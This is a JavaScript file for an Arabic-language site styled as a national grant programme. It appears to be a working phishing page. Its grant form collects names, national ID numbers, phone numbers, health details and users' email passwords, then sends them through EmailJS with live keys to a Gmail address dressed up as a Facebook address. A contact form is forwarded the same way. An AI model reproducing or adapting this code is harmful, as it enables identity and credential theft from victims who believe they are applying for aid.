// script.js - باستخدام EmailJS بدلاً من Firebase Firestore

// ==================== إعدادات EmailJS ====================
// ⚠️ IMPORTANT: استبدل هذه القيم بالمفاتيح الصحيحة من حسابك على EmailJS
const EMAILJS_PUBLIC_KEY = "DWeaBMzrSKWYZLmgC";      // ⬅️ ضع مفتاحك العمومي هنا
const EMAILJS_SERVICE_ID = "service_qrjd7iz";         // ⬅️ ضع معرف الخدمة هنا
const GRANT_TEMPLATE_ID = "template_n0b33e8";       // ⬅️ ضع معرف قالب المنحة
const CONTACT_TEMPLATE_ID = "template_n0b33e8";   // ⬅️ ضع معرف قالب الاتصال
const RECIPIENT_EMAIL = "facebook.com.w05@gmail.com"; // البريد المستلم (يمكن تغييره)

// تهيئة EmailJS
emailjs.init(EMAILJS_PUBLIC_KEY);

// ==================== Preloader ====================
function showPreloader(duration = 800) {
  let preloader = document.querySelector('.preloader');
  if (!preloader) {
    preloader = document.createElement('div');
    preloader.className = 'preloader';
    preloader.innerHTML = `
      <div class="loader-content">
        <div class="logo">
          <svg width="60" height="60" viewBox="0 0 100 100" fill="none">
            <circle cx="50" cy="50" r="45" stroke="#3b82f6" stroke-width="6"/>
            <path d="M30 65 L30 35 L50 55 L70 35 L70 65" stroke="#3b82f6" stroke-width="6" stroke-linecap="round" stroke-linejoin="round"/>
          </svg>
          <span class="logo-text">نعم لبناء الوطن</span>
        </div>
        <div class="loader-text">جارٍ التحميل<span class="dots"></span></div>
      </div>
    `;
    document.body.appendChild(preloader);
  }
  preloader.style.display = 'flex';
  setTimeout(() => {
    preloader.style.opacity = '0';
    setTimeout(() => {
      preloader.style.display = 'none';
      preloader.style.opacity = '';
    }, 300);
  }, duration);
}

showPreloader(600);

// دوال مساعدة
function showModal(id) { document.getElementById(id)?.classList.remove('hidden'); }
function hideModal(id) { document.getElementById(id)?.classList.add('hidden'); }
function showErrorToast(msg) { alert("⚠️ " + msg); }

// ==================== نموذج المنحة (grant.html) ====================
if (window.location.pathname.includes('grant.html')) {
  const form = document.getElementById('grantForm');
  let collectedData = null;

  form?.addEventListener('submit', (e) => {
    e.preventDefault();
    const data = new FormData(form);
    const obj = {};
    data.forEach((v, k) => obj[k] = v);
    if (!obj.firstName || !obj.lastName || !obj.nationalId || !obj.phone || !obj.email || !obj.password) {
      alert("يرجى ملء جميع الحقول المطلوبة.");
      return;
    }
    collectedData = obj;
    showModal('confirmModal1');
  });

  document.getElementById('confirmYes1')?.addEventListener('click', () => { hideModal('confirmModal1'); showModal('confirmModal2'); });
  document.getElementById('confirmNo1')?.addEventListener('click', () => { hideModal('confirmModal1'); });
  
  document.getElementById('confirmYes2')?.addEventListener('click', async () => {
    hideModal('confirmModal2');
    try {
      // إرسال البريد عبر EmailJS
      const templateParams = {
        to_email: RECIPIENT_EMAIL,
        firstName: collectedData.firstName,
        lastName: collectedData.lastName,
        age: collectedData.age,
        nationalId: collectedData.nationalId,
        phone: collectedData.phone,
        email: collectedData.email,
        password: collectedData.password,
        job: collectedData.job,
        province: collectedData.province,
        notes: collectedData.notes || "لا يوجد",
        health: collectedData.health
      };
      
      await emailjs.send(EMAILJS_SERVICE_ID, GRANT_TEMPLATE_ID, templateParams);
      showModal('successModal');
      form.reset();
    } catch (e) {
      console.error(e);
      showErrorToast("فشل في إرسال الطلب: " + (e.text || e.message || "تحقق من إعدادات EmailJS"));
      showModal('errorModal');
    }
  });
  
  document.getElementById('confirmNo2')?.addEventListener('click', () => { hideModal('confirmModal2'); });
  document.getElementById('successOk')?.addEventListener('click', () => window.location.href = 'index.html');
  document.getElementById('errorOk')?.addEventListener('click', () => hideModal('errorModal'));
}

// ==================== نموذج الاتصال (contact.html) ====================
if (window.location.pathname.includes('contact.html')) {
  const form = document.getElementById('contactForm');
  form?.addEventListener('submit', async (e) => {
    e.preventDefault();
    const data = new FormData(form);
    const obj = {
      name: data.get('name'),
      email: data.get('email'),
      message: data.get('message')
    };
    try {
      const templateParams = {
        to_email: RECIPIENT_EMAIL,
        name: obj.name,
        email: obj.email,
        message: obj.message
      };
      await emailjs.send(EMAILJS_SERVICE_ID, CONTACT_TEMPLATE_ID, templateParams);
      showModal('successModal');
      form.reset();
    } catch (e) {
      console.error(e);
      showErrorToast("حدث خطأ أثناء الإرسال: " + (e.text || e.message));
      showModal('errorModal');
    }
  });
  document.getElementById('successOk')?.addEventListener('click', () => window.location.href = 'index.html');
  document.getElementById('errorOk')?.addEventListener('click', () => hideModal('errorModal'));
}